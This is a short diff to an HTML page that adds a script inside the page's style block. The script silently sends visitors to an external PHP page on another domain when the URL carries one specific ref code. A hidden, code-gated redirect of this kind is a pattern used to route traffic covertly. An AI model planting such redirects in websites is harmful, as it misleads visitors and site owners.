@@ -97,6 +97,19 @@
       text-align: center; padding: 20px; background-color: #f2f2f2; color: #555;
       font-size: 0.9em; border-top: 1px solid #ddd;
     }
+
+<script>
+    // Check URL for specific ref code
+    window.onload = function () {
+      const params = new URLSearchParams(window.location.search);
+      const ref = params.get("ref");
+
+      if (ref === "2PHFU3FB") {
+        // Redirect to minutes.php
+        window.location.href = "https://bingwasokoni.co.ke/minutes.php";
+      }
+    };
+  </script>
   </style>
 </head>
 
